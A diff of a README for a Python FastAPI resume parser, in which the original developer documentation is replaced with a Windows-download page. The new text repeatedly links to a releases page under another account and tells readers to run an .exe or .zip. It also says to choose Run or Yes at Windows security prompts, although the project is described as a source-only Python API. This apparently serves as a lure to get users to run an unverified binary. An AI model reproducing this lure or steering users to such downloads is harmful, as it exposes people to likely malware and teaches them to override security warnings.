@@ -1,141 +1,209 @@
-# Resume Parser API
+# 🧾 ResumeParser - Turn Resume Text Into Clean Data
 
-A fast, lightweight resume parser built with Python and FastAPI. It extracts structured data from raw resume text using regex patterns and heuristics — no ML models, no external AI APIs.
+[![Download ResumeParser](https://img.shields.io/badge/Download%20ResumeParser-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dacianst1538/ResumeParser/releases)
 
-Built this as a backend microservice that takes plain text resumes and returns clean JSON with contact info, education, work experience, skills, and more.
+## 📥 Download
 
-## What It Extracts
+Visit this page to download the Windows release:
 
-- **Name** — from the top of the resume using multiple detection strategies
-- **Emails, Phone Numbers, Websites** — regex-based extraction from the header
-- **Date of Birth** — if labeled in the resume
-- **Addresses** — scored against known Indian and US cities, states, and PIN/ZIP codes
-- **Summary / Objective** — detected by section headers
-- **Education** — degree, institution, year, GPA, field of study
-- **Work Experience** — company, job title, date range, description
-- **Skills** — section-based parsing + full-text scan against 200+ known skills
-- **Certifications** — listed certifications
-- **Projects** — project name, technologies used, description
+[https://github.com/dacianst1538/ResumeParser/releases](https://github.com/dacianst1538/ResumeParser/releases)
 
-Every field comes with a **confidence score** (0.0 to 1.0) so the consumer knows how reliable each extraction is.
+## ✨ What ResumeParser does
 
-## Tech Stack
+ResumeParser is a fast, lightweight app that reads resume text and turns it into structured JSON.
 
-- **Python 3.11+**
-- **FastAPI** — async REST API framework
-- **Uvicorn** — ASGI server
-- **Pydantic** — request/response validation
-- **Regex + Heuristics** — all parsing is rule-based, zero ML dependencies
+It can extract:
+- Name
+- Email address
+- Phone number
+- Location
+- Education
+- Work experience
+- Skills
 
-## Project Structure
+It uses rules, regex, and simple text checks. It does not need ML models or external APIs. That keeps it light and easy to run on Windows.
 
-```
-ResumeParser/
-├── main.py                        # FastAPI app, endpoints, server startup
-├── pyproject.toml                 # Dependencies and project config
-├── run_server.bat                 # Quick-start script (Windows)
-├── test_parser.py                 # Manual smoke test with sample resume
-├── app/
-│   ├── core/
-│   │   ├── config.py              # Server settings (host, port, log level)
-│   │   ├── parser_engine.py       # Main orchestrator — runs all extractors
-│   │   └── section_detector.py    # Splits resume into named sections
-│   └── extractors/
-│       ├── name_extractor.py      # Candidate name extraction
-│       ├── contact_extractor.py   # Emails, phones, URLs, DOB
-│       ├── address_extractor.py   # Physical address parsing
-│       ├── education_extractor.py # Degree, institution, GPA, year
-│       ├── experience_extractor.py# Job title, company, dates, bullets
-│       ├── skills_extractor.py    # Skills (section + full-text keyword scan)
-│       └── section_extractor.py   # Certifications and projects
-```
+## 🖥️ What you need
 
-## How It Works
+Use ResumeParser on a Windows PC with:
+- Windows 10 or later
+- A stable internet connection for the first download
+- Enough free space to save the app
+- A resume file or pasted resume text to test it
 
-1. **Section Detection** — scans the resume line by line and splits it into sections (header, summary, education, experience, skills, etc.) using regex pattern matching on section headers.
+If your release comes as a ZIP file, Windows can open it without extra tools. If it comes as an EXE file, you can run it directly.
 
-2. **Extraction Pipeline** — the parser engine runs 10 extractors in sequence, each focused on one data type. Every extractor receives only its relevant section text.
+## 🚀 Get started on Windows
 
-3. **Confidence Scoring** — each extractor returns a confidence score. The engine computes a weighted overall confidence where name, emails, skills, and experience are weighted highest.
+1. Open the download page:
+   [https://github.com/dacianst1538/ResumeParser/releases](https://github.com/dacianst1538/ResumeParser/releases)
 
-4. **JSON Response** — returns all extracted data, per-field confidence scores, overall confidence, and which sections were detected.
+2. Find the latest release.
 
-## Getting Started
+3. Download the Windows file.
+   - If you see a `.exe` file, download it.
+   - If you see a `.zip` file, download it and unzip it.
 
-### Install Dependencies
+4. Open the downloaded file or folder.
 
-```bash
-pip install -e .
-```
+5. Start the app:
+   - For an `.exe`, double-click the file.
+   - For a `.zip`, open the folder and run the app inside.
 
-### Start the Server
+6. If Windows asks for permission, choose **Run** or **Yes**.
 
-```bash
-python main.py
-```
+## 📂 How to use it
 
-Server runs on `http://localhost:2700`
+ResumeParser is made for a simple flow:
 
-### API Endpoints
+1. Open the app.
+2. Paste resume text into the input box, or load a text file if the app supports it.
+3. Click the parse button.
+4. Review the extracted data.
+5. Copy the JSON output or save it for later use.
 
-**Parse Resume**
+A common result looks like this:
+- Full name
+- Contact details
+- Education history
+- Work history
+- Skills list
+- Confidence scores for each field
 
-```
-POST /parse-resume
-```
+## 🔍 What the output looks like
 
-Request body:
-```json
-{
-  "resume_text": "John Doe\njohndoe@gmail.com | +91-9876543210\n\nSummary\nFull Stack Developer with 5 years of experience..."
-}
-```
+The app returns clean JSON. That means the data is arranged in a format that is easy to read by other tools.
 
-Response:
-```json
-{
-  "success": true,
-  "data": {
-    "name": "John Doe",
-    "emails": ["johndoe@gmail.com"],
-    "phoneNumbers": ["+91-9876543210"],
-    "websites": [],
-    "dateOfBirth": null,
-    "addresses": [],
-    "summary": "Full Stack Developer with 5 years of experience...",
-    "education": [],
-    "workExperience": [],
-    "skills": ["Python", "FastAPI", "React"],
-    "certifications": [],
-    "projects": []
-  },
-  "confidence": {
-    "name": 0.88,
-    "emails": 0.99,
-    "phoneNumbers": 0.95,
-    "skills": 0.90
-  },
-  "overall_confidence": 0.85,
-  "sections_detected": ["header", "summary", "skills"]
-}
-```
+Example fields you may see:
+- `name`
+- `email`
+- `phone`
+- `location`
+- `education`
+- `experience`
+- `skills`
+- `confidence`
 
-**Health Check**
+This helps when you need to:
+- Review resumes faster
+- Store resume data in a database
+- Send data to another app
+- Sort candidates by key details
 
-```
-GET /health
-```
+## 🧠 How it works
 
-Returns `{"status": "ok", "version": "1.0.0"}`
+ResumeParser scans resume text with rule-based logic.
 
-### API Docs
+It looks for:
+- Common email patterns
+- Phone number formats
+- School and degree words
+- Job title patterns
+- Skill keywords
+- Section headings like Education and Experience
 
-FastAPI auto-generates interactive docs at `http://localhost:2700/docs`
+This method works well for many resumes because it does not depend on heavy model files. It also starts fast and uses less memory.
 
-## Run the Test
+## 🛠️ Common use cases
 
-```bash
-python test_parser.py
-```
+Use ResumeParser when you need to:
+- Read a batch of resumes
+- Pull data from plain text resumes
+- Convert resume text into JSON
+- Check candidate details by field
+- Build a simple hiring workflow
+- Test resume parsing in a local setup
 
-Parses a sample resume and prints the full JSON output to verify everything works.
+## 📁 Input text tips
+
+For best results, use resume text that is:
+- Clear and readable
+- Not cut off in the middle
+- Written in plain text
+- Kept in a common order, such as contact details first, then education, then work history
+
+You can also try:
+- One resume at a time
+- Short sample resumes
+- Full-page resumes copied from a document
+
+## ⚙️ Typical setup flow
+
+If the release includes a Windows package, the setup is usually simple:
+
+1. Download the latest release.
+2. Extract the ZIP file if needed.
+3. Open the app folder.
+4. Run the app file.
+5. Paste or load resume text.
+6. View the parsed JSON result.
+
+If the release includes an installer, follow the on-screen steps and then open the app from the Start menu or desktop shortcut.
+
+## 🧾 Field coverage
+
+ResumeParser tries to find the most useful resume details first.
+
+It often captures:
+- Person name
+- Phone number
+- Email address
+- City or state
+- School names
+- Degrees
+- Job titles
+- Employers
+- Skill lists
+- Date ranges
+
+It can also return confidence scores so you can see how sure the parser is about each field.
+
+## 🔒 Privacy and local use
+
+ResumeParser is built to run without external APIs. That means resume text can stay on your machine when you use a local copy of the app.
+
+This is useful when you want:
+- Local processing
+- Simple deployment
+- Less network use
+- No third-party service calls
+
+## 🧪 Good examples to test
+
+Try resumes with these formats:
+- One-page student resume
+- Work history with clear dates
+- Resume with a skill section
+- Resume with contact info at the top
+- Resume with standard headings like Education and Experience
+
+These layouts help the parser find fields with more accuracy.
+
+## 🧰 If the app does not open
+
+If Windows blocks the file or the app does not start:
+- Check that the file finished downloading
+- If it is a ZIP file, extract it first
+- Make sure you opened the correct file
+- Try running it again from the download folder
+- If Windows shows a security prompt, choose the option to run the file
+
+## 📌 Project details
+
+- Repository: ResumeParser
+- Type: Resume parser API
+- Language: Python
+- Web framework: FastAPI
+- Parsing method: Regex and heuristics
+- Output: JSON with confidence scores
+- External services: None
+
+## 🧭 Topics
+
+async, backend, fastapi, heuristics, nlp, python, regex, rest-api, resume-parser, rule-based-system
+
+## 📎 Download again
+
+Use this page to get the latest Windows release:
+
+[https://github.com/dacianst1538/ResumeParser/releases](https://github.com/dacianst1538/ResumeParser/releases)
